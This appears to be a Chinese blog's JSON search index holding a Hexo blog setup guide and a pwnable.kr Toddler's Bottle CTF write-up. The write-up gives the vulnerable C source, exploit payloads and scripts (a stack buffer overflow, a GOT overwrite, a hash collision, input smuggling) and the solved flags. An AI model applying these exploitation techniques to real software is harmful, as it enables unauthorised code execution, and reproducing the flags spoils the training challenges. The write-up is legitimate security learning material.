[{"title":"Hexo 博客搭建","url":"/applications/hexo/hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","content":"Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n\n安装应用Hexo 基于 Node.js 开发，需要以下工具支撑运行。\n\nNode.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)\nGit\n\n通过 npm 安装 Hexo 应用。\nnpm install -g hexo-cli\n\n创建博客新建任意目录，作为 Hexo 博客的根目录。\nmkdir test-blog\n\n初始化 Hexo 博客，新建和下载所需要的文件。\ncd test-bloghexo init\n\n完成之后，目录的基本结构如下所示。\n.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes\n\n启动 Node.js 内置的服务器，在本地预览博客。\nhexo clean      # 清除缓存文件和已生成的静态文件hexo generate   # 可以缩写成hexo g，生成静态文件。hexo server     # 可以缩写成hexo d，启动服务器。\n\n默认情况下，通过 http://localhost:4000 访问博客。\n\n配置博客Hexo 博客的一些基础配置。\n博客主题基于 Next 主题进行配置。\n在博客根目录下载 Next 主题。\ngit clone https://github.com/next-theme/hexo-theme-next themes/next\n\n将博客主题配置文件复制到博客根目录。\ncp themes/next/_config.yml ./_config.next.yml\n\n编辑 _config.yml 配置文件。\n# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next\n\n分类页面在博客根目录执行新建页面命令。\nhexo new page categories\n\n打开 source/categories/index.md 文件，在顶部的 YAML 代码块中配置以下内容。\ntitle: 分类date: 2025-10-22 15:30:18type: &quot;categories&quot;\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启用分类页面显示。\n# Usage: `Key: /link/ || icon`# Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.# Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.# External url should start with http:// or https://menu:  home: / || fa fa-home  #about: /about/ || fa fa-user  #tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  #archives: /archives/ || fa fa-archive  #schedule: /schedule/ || fa fa-calendar  #sitemap: /sitemap.xml || fa fa-sitemap  #commonweal: /404/ || fa fa-heartbeat\n\n标签页面在博客根目录执行新建页面命令。\nhexo new page tags\n\n打开 source/tags/index.md 文件，在顶部的 YAML 代码块中配置以下内容。\ntitle: 标签date: 2025-10-22 15:30:23type: &quot;tags&quot;\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启用标签页面显示。\n# Usage: `Key: /link/ || icon`# Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.# Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.# External url should start with http:// or https://menu:  home: / || fa fa-home  #about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  #categories: /categories/ || fa fa-th  #archives: /archives/ || fa fa-archive  #schedule: /schedule/ || fa fa-calendar  #sitemap: /sitemap.xml || fa fa-sitemap  #commonweal: /404/ || fa fa-heartbeat\n\n内容搜索使用 npm 安装 hexo-generator-searchdb 模块。\nnpm install hexo-generator-searchdb\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启动本地搜索模块。\n# Local Search# Dependencies: https://github.com/next-theme/hexo-generator-searchdblocal_search:  enable: true  # Show top n results per article, show all results by setting to -1  top_n_per_article: 1  # Unescape html strings to the readable one.  unescape: false  # Preload the search data when the page loads.  preload: false\n\n编辑 _config.yml 文件，新增以下配置。\n# Search## Local Searchsearch:  path: search.json  field: post  content: true  format: striptags\n\n图片引用默认情况下，可以直接使用 MarkDown 语法在文章中引用本地或者图床中的图片。\n![This is an example image](/images/example.png)![This is an example image](https://xxx.xxx.com/images/example.png)\n\n对于本地图片资源，为了便于组织和管理，可以启用资源目录，将图片与文章放置在一起，通过相对路径进行引用。\n# _config.ymlpost_asset_folder: true\n\n文章与图片的目录结构如下，每篇文章对应一个同名的资源目录。\n_post├── example.md└── example\t└── example.png\n\n使用 MarkDown 语法或者标签插件提供的语法在文章中引用图片。\n![This is an example image](example/example.png)&#123;% asset_img example.png This is an example image %&#125;\n\n在 hexo-renderer-marked 3.1.0 中，引入了新的配置选项，用于简化 MarkDown 引用图片的语句。\n# _config.ymlpost_asset_folder: truemarked:  prependRoot: false  postAsset: true\n\n使用简化的 MarkDown 语法在文章中引用本地图片。\n![This is an example image](example.png)\n\n部署博客Hexo 提供了快速部署功能，可以将博客快速部署到指定服务器。\nGitHub在 GitHub 中新建公共仓库，仓库名必须为 &lt;GitHub用户名&gt;.github.io 格式。\n本地配置 Git 用户信息，并生成 SSH 密钥对。\ngit config --global user.name &quot;&lt;用户名称&gt;&quot;git config --global user.email &quot;&lt;用户邮箱&gt;&quot;ssh-keygen -t rsa -C &quot;&lt;用户邮箱&gt;&quot;\n\n复制 ~/.ssh 目录下 id_rsa.pub 文件中的 SSH 公钥信息，将其添加到 GitHub 设置中。\n\n安装 hexo-deployer-git 插件。\nnpm install hexo-deployer-git --save\n\n编辑 _config.yml 配置文件，修改部署配置。\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo: git@github.com:&lt;GitHub用户名&gt;/GitHub用户名&gt;.github.io.git  branch: main\n\n将博客部署到 GitHub 仓库。\nhexo d\n\n等待一段时间后，可以通过 https://&lt;GitHub用户名&gt;.github.io 访问博客。\n参考链接文档 | Hexo\n","categories":["工具应用","Hexo"],"tags":["Hexo"]},{"title":"Pwnable.kr Toddler's Bottle 练习记录","url":"/cybersecurity/ctf/pwnable-kr/pwnable-kr-toddler-s-bottle-%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","content":"Pwnable.kr Toddler&#39;s Bottle 练习记录。\n\n\nfd查看程序源码，需要使 buf 为 &quot;LETMEWIN&quot; 字符串才可以得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;pass argv[1] a number\\n&quot;);\t\treturn 0;\t&#125;\tint fd = atoi( argv[1] ) - 0x1234;\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(&quot;LETMEWIN\\n&quot;, buf))&#123;\t\tprintf(&quot;good job :)\\n&quot;);\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\texit(0);\t&#125;\tprintf(&quot;learn about Linux file IO\\n&quot;);\treturn 0;&#125;\n\n在 Linux 系统中，文件描述符使用 int 类型进行表示，其中有三个系统默认值。\n\n0：stdin，标准输入流\n1：stdout，标准输出流\n2：stderr，标准错误流\n\n当程序中 fd 的值为 0 时，表示 read() 函数将从 stdin 流中读取 32 字节数据到 buf 数组中，此时可以控制 buf 为 &quot;LETMEWIN&quot; 字符串，得到 flag 信息。\nfd@ubuntu:~$ ./fd 4660LETMEWINgood job :)Mama! Now_I_understand_what_file_descriptors_are!\n\ncollision查看程序源码，当输入的字符相加为 0x21DD09EC 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123;\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++)&#123;\t\tres += ip[i];\t&#125;\treturn res;&#125;int main(int argc, char* argv[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;usage : %s [passcode]\\n&quot;, argv[0]);\t\treturn 0;\t&#125;\tif(strlen(argv[1]) != 20)&#123;\t\tprintf(&quot;passcode length should be 20 bytes\\n&quot;);\t\treturn 0;\t&#125;\tif(hashcode == check_password( argv[1] ))&#123;\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;\t&#125;\telse\t\tprintf(&quot;wrong passcode.\\n&quot;);\treturn 0;&#125;\n\n由 0x21DD09EC 为 568134124 可知，当 0x21DD09EC + 0x1 &#x3D; 0x21DD09ED 时，能够被 5 除尽，所以可以得到 0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9 和 0x6C5CEC8 等 5 个用于相加的数值。\n构造用于输入的字符串，读取 flag 信息。\ncol@ubuntu:~$ ./col `python2 -c &#x27;print &quot;\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC8\\xCE\\xC5\\x06&quot;&#x27;`Two_hash_collision_Nicely\n\nbof查看程序源码，当 key 为 0xcafebabe 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n通过 gets() 函数获取输入时，并不会对输入数据的长度进行检查，因此输入长度超过 32 字节便会溢出 overflowme 数组的内存空间。\n查看 func 函数的栈布局。\n-000000000000002C     char overflowme[32];-000000000000000C     _DWORD var_C;-0000000000000008     // padding byte-0000000000000007     // padding byte-0000000000000006     // padding byte-0000000000000005     // padding byte-0000000000000004     // padding byte-0000000000000003     // padding byte-0000000000000002     // padding byte-0000000000000001     // padding byte+0000000000000000     _DWORD __saved_registers;+0000000000000004     _UNKNOWN *__return_address;+0000000000000008     _DWORD key;\n\n其中 overflowme 距离 key 偏移为 0x34 字节，当填充 56 字节的数据时，便可以覆盖 key 的值。\n在题目服务器的 /tmp 目录中新建任意目录，创建 Python 脚本文件，内容如下。\n#!/usr/bin/python3from pwn import *payload = b&#x27;A&#x27; * 0x34payload += b&#x27;\\xbe\\xba\\xfe\\xca&#x27;target = remote(&#x27;0.0.0.0&#x27;, 9000)target.sendline(payload)target.interactive()\n\n运行脚本，得到 flag 信息。\nbof@ubuntu:/tmp/bof_test$ python3 get_flag.py[+] Opening connection to 0.0.0.0 on port 9000: Done[*] Switching to interactive mode$ lsbofbof.cflaglogsuper.pl$ cat flagDaddy_I_just_pwned_a_buff3r!$\n\npasscode查看程序源码，当 passcode1 为 123456 和 passcode2 为 13371337 时得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123;\tint passcode1;\tint passcode2;\tprintf(&quot;enter passcode1 : &quot;);\tscanf(&quot;%d&quot;, passcode1);\tfflush(stdin);\t// ha! mommy told me that 32bit is vulnerable to bruteforcing :)\tprintf(&quot;enter passcode2 : &quot;);        scanf(&quot;%d&quot;, passcode2);\tprintf(&quot;checking...\\n&quot;);\tif(passcode1==123456 &amp;&amp; passcode2==13371337)&#123;                printf(&quot;Login OK!\\n&quot;);\t\tsetregid(getegid(), getegid());                system(&quot;/bin/cat flag&quot;);        &#125;        else&#123;                printf(&quot;Login Failed!\\n&quot;);\t\texit(0);        &#125;&#125;void welcome()&#123;\tchar name[100];\tprintf(&quot;enter you name : &quot;);\tscanf(&quot;%100s&quot;, name);\tprintf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123;\tprintf(&quot;Toddler&#x27;s Secure Login System 1.1 beta.\\n&quot;);\twelcome();\tlogin();\t// something after login...\tprintf(&quot;Now I can safely trust you that you have credential :)\\n&quot;);\treturn 0;\t&#125;\n\n在 login() 函数中，可以看到 passcode1 和 passcode2 通过 scanf() 函数接收输入时，缺少 &amp; 符号，这将导致实际存储数据的内存地址由两个变量的数值决定。\n经过调试分析发现 welcome() 函数中 name 数组的最后 4 个字节，恰好与 passcode1 重叠，因此可以通过 name 数组来控制 passcode1 的值，从而实现任意地址写入。\n// eax = 0xffffd098 -&gt; name array address*EAX  0xffffd098 ◂— 0x28 /* &#x27;(&#x27; */   0x804931e &lt;welcome+44&gt;    add    esp, 0x10   0x8049321 &lt;welcome+47&gt;    sub    esp, 8   0x8049324 &lt;welcome+50&gt;    lea    eax, [ebp - 0x70] ► 0x8049327 &lt;welcome+53&gt;    push   eax   0x8049328 &lt;welcome+54&gt;    lea    eax, [ebx - 0x1f8b]   0x804932e &lt;welcome+60&gt;    push   eax   0x804932f &lt;welcome+61&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;      // ebp - 0x10 = 0xffffd0f8 -&gt; passcode1 address EBP  0xffffd108 —▸ 0xffffd118 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0   0x8049218 &lt;login+34&gt;    add    esp, 0x10   0x804921b &lt;login+37&gt;    sub    esp, 8 ► 0x804921e &lt;login+40&gt;    push   dword ptr [ebp - 0x10]   0x8049221 &lt;login+43&gt;    lea    eax, [ebx - 0x1fe5]   0x8049227 &lt;login+49&gt;    push   eax   0x8049228 &lt;login+50&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt; // ebp - 0xc = 0xffffd0fc -&gt; passcode2 address EBP  0xffffd108 —▸ 0xffffd118 ◂— 0x1e240     0x8049253 &lt;login+93&gt;     add    esp, 0x10   0x8049256 &lt;login+96&gt;     sub    esp, 8 ► 0x8049259 &lt;login+99&gt;     push   dword ptr [ebp - 0xc]   0x804925c &lt;login+102&gt;    lea    eax, [ebx - 0x1fe5]   0x8049262 &lt;login+108&gt;    push   eax   0x8049263 &lt;login+109&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;\n\n借助任意地址写入功能，可以通过改写 GOT 表中的函数地址来跳转到任意地址进行执行，从而绕过校验代码，得到 flag 信息。\n查看 .got.plt 中的函数列表。\npasscode@ubuntu:~$ readelf -r passcodeRelocation section &#x27;.rel.dyn&#x27; at offset 0x430 contains 2 entries: Offset     Info    Type            Sym.Value  Sym. Name0804bff8  00000806 R_386_GLOB_DAT    00000000   __gmon_start__0804bffc  00000a06 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0Relocation section &#x27;.rel.plt&#x27; at offset 0x440 contains 10 entries: Offset     Info    Type            Sym.Value  Sym. Name0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.340804c010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.00804c014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.00804c018  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.40804c01c  00000507 R_386_JUMP_SLOT   00000000   getegid@GLIBC_2.00804c020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.00804c024  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.00804c028  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.00804c02c  00000b07 R_386_JUMP_SLOT   00000000   setregid@GLIBC_2.00804c030  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7\n\n由于 fflush() 函数会刷新输入缓冲区，所以选择覆盖 GOT 表中 fflush() 函数的地址。\n通过 fflush() 函数直接跳转到校验成功分支。\n.text:0804928F                 sub     esp, 0Ch.text:08049292                 lea     eax, (aLoginOk - 804C000h)[ebx] ; &quot;Login OK!&quot;.text:08049298                 push    eax             ; s.text:08049299                 call    _puts.text:0804929E                 add     esp, 10h.text:080492A1                 call    _getegid.text:080492A6                 mov     esi, eax.text:080492A8                 call    _getegid.text:080492AD                 sub     esp, 8.text:080492B0                 push    esi             ; egid.text:080492B1                 push    eax             ; rgid.text:080492B2                 call    _setregid.text:080492B7                 add     esp, 10h.text:080492BA                 sub     esp, 0Ch.text:080492BD                 lea     eax, (aBinCatFlag - 804C000h)[ebx] ; &quot;/bin/cat flag&quot;.text:080492C3                 push    eax             ; command.text:080492C4                 call    _system.text:080492C9                 add     esp, 10h.text:080492CC                 jmp     short loc_80492EA\n\n借助 Python 向程序传参，得到 flag 信息。\npasscode@ubuntu:~$ python2 -c &#x27;print &quot;a&quot; * 96 + &quot;\\x14\\xc0\\x04\\x08&quot; + &quot;134517409&quot;&#x27; | ./passcodeToddler&#x27;s Secure Login System 1.1 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!s0rry_mom_I_just_ign0red_c0mp1ler_w4rningenter passcode1 : Now I can safely trust you that you have credential :)\n\nrandom查看程序源码，当输入数据与随机数异或结果为 0xcafebabe 时，得到 flag 信息。\n#include &lt;stdio.h&gt;int main()&#123;\tunsigned int random;\trandom = rand();\t// random value!\tunsigned int key=0;\tscanf(&quot;%d&quot;, &amp;key);\tif( (key ^ random) == 0xcafebabe )&#123;\t\tprintf(&quot;Good!\\n&quot;);\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;\t&#125;\tprintf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;);\treturn 0;&#125;\n\n由于程序在调用 rand() 函数之前，未调用 srand() 函数初始化随机数种子，因此系统会默认以 1 为种子生成随机数，这将导致每次运行程序生成的随机数均相同。\n本地调试程序，得到生成的随机数 0x6b8b4567。\n*RAX  0x6b8b4567   0x555555555216 &lt;main+13&gt;    mov    rax, qword ptr fs:[0x28]   0x55555555521f &lt;main+22&gt;    mov    qword ptr [rbp - 0x18], rax   0x555555555223 &lt;main+26&gt;    xor    eax, eax   0x555555555225 &lt;main+28&gt;    mov    eax, 0   0x55555555522a &lt;main+33&gt;    call   rand@plt                    &lt;rand@plt&gt;  ► 0x55555555522f &lt;main+38&gt;    mov    dword ptr [rbp - 0x1c], eax\n\n异或计算得到正确的 key 值为 0xa175ffd9，即十进制 2708864985。\n运行程序，得到 flag 信息。\nrandom@ubuntu:~$ ./random2708864985Good!m0mmy_I_can_predict_rand0m_v4lue!\n\ninput2查看程序源码，需要满足五个条件才能得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123;\tprintf(&quot;Welcome to pwnable.kr\\n&quot;);\tprintf(&quot;Let&#x27;s see if you know how to give input to program\\n&quot;);\tprintf(&quot;Just give me correct inputs then you will get the flag :)\\n&quot;);\t// argv\tif(argc != 100) return 0;\tif(strcmp(argv[&#x27;A&#x27;],&quot;\\x00&quot;)) return 0;\tif(strcmp(argv[&#x27;B&#x27;],&quot;\\x20\\x0a\\x0d&quot;)) return 0;\tprintf(&quot;Stage 1 clear!\\n&quot;);\t\t// stdio\tchar buf[4];\tread(0, buf, 4);\tif(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;\tread(2, buf, 4);        if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;\tprintf(&quot;Stage 2 clear!\\n&quot;);\t\t// env\tif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;\tprintf(&quot;Stage 3 clear!\\n&quot;);\t// file\tFILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);\tif(!fp) return 0;\tif( fread(buf, 4, 1, fp)!=1 ) return 0;\tif( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;\tfclose(fp);\tprintf(&quot;Stage 4 clear!\\n&quot;);\t\t// network\tint sd, cd;\tstruct sockaddr_in saddr, caddr;\tsd = socket(AF_INET, SOCK_STREAM, 0);\tif(sd == -1)&#123;\t\tprintf(&quot;socket error, tell admin\\n&quot;);\t\treturn 0;\t&#125;\tsaddr.sin_family = AF_INET;\tsaddr.sin_addr.s_addr = INADDR_ANY;\tsaddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );\tif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;\t\tprintf(&quot;bind error, use another port\\n&quot;);    \t\treturn 1;\t&#125;\tlisten(sd, 1);\tint c = sizeof(struct sockaddr_in);\tcd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);\tif(cd &lt; 0)&#123;\t\tprintf(&quot;accept error, tell admin\\n&quot;);\t\treturn 0;\t&#125;\tif( recv(cd, buf, 4, 0) != 4 ) return 0;\tif(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;\tprintf(&quot;Stage 5 clear!\\n&quot;);\t// here&#x27;s your flag\tsetregid(getegid(), getegid());\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;&#125;\n\n第一个条件，通过 Shell 传递 100 个参数，且第 A (65) 个参数为 \\x00，第 B (66) 个参数为 \\x20\\x0a\\x0d。\n// argvif(argc != 100) return 0;if(strcmp(argv[&#x27;A&#x27;],&quot;\\x00&quot;)) return 0;if(strcmp(argv[&#x27;B&#x27;],&quot;\\x20\\x0a\\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\\n&quot;);\t\n\n第二个条件，向 stdio 中写入 \\x00\\x0a\\x00\\xff，向 stderr 中写入 \\x00\\x0a\\x02\\xff。\n// stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;read(2, buf, 4);       if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\\n&quot;);\n\n第三个条件，新增 \\xde\\xad\\xbe\\xef 环境变量，设置值为 \\xca\\xfe\\xba\\xbe。\n// envif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;printf(&quot;Stage 3 clear!\\n&quot;);\n\n第四个条件，新建 \\x0a 文件，内容为 \\x00\\x00\\x00\\x00。\n// fileFILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;fclose(fp);printf(&quot;Stage 4 clear!\\n&quot;);\t\n\n第五个条件，通过 Shell 第 C (67) 个参数指定监听端口，建立连接发送 \\xde\\xad\\xbe\\xef 数据。\n// networkint sd, cd;struct sockaddr_in saddr, caddr;sd = socket(AF_INET, SOCK_STREAM, 0);if(sd == -1)&#123;\tprintf(&quot;socket error, tell admin\\n&quot;);\treturn 0;&#125;saddr.sin_family = AF_INET;saddr.sin_addr.s_addr = INADDR_ANY;saddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;\tprintf(&quot;bind error, use another port\\n&quot;);   \t\treturn 1;&#125;listen(sd, 1);int c = sizeof(struct sockaddr_in);cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);if(cd &lt; 0)&#123;\tprintf(&quot;accept error, tell admin\\n&quot;);\treturn 0;&#125;if( recv(cd, buf, 4, 0) != 4 ) return 0;if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;printf(&quot;Stage 5 clear!\\n&quot;);\n\n根据条件，编写利用脚本。\n#!/usr/bin/python3import osimport timeimport socketimport subprocessport = 10000if __name__ == &quot;__main__&quot;:    args = list(&quot;A&quot; * 100)    args[0] = &quot;/home/input2/input2&quot;    args[ord(&#x27;A&#x27;)] = &quot;&quot;    args[ord(&#x27;B&#x27;)] = &quot;\\x20\\x0a\\x0d&quot;    args[ord(&#x27;C&#x27;)] = str(port)    stdinr, stdinw = os.pipe()    stderrr, stderrw = os.pipe()    os.write(stdinw, b&quot;\\x00\\x0a\\x00\\xff&quot;)    os.write(stderrw, b&quot;\\x00\\x0a\\x02\\xff&quot;)    environ = &#123;b&quot;\\xde\\xad\\xbe\\xef&quot;: b&quot;\\xca\\xfe\\xba\\xbe&quot;&#125;    f = open(&quot;\\x0a&quot;, &quot;w+&quot;)    f.write(&quot;\\x00\\x00\\x00\\x00&quot;)    f.close()    target = subprocess.Popen(args, stdin=stdinr, stderr=stderrr, env=environ)    time.sleep(2)    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server.connect((&quot;127.0.0.1&quot;, port))    server.send(b&quot;\\xde\\xad\\xbe\\xef&quot;)    server.close()\n\n将脚本上传到服务器 /tmp 下新建的目录中，并通过软链接引用 flag 文件。\nln -s /home/input2/flag ./flag\n\n运行脚本，获取 flag 信息。\ninput2@ubuntu:/tmp/input2_test$ python3 get_flag.pyWelcome to pwnable.krLet&#x27;s see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy_now_I_know_how_to_pa5s_inputs_in_Linux\n\n参考链接pwnable.kr\n","categories":["网络安全","CTF"],"tags":["CTF"]}]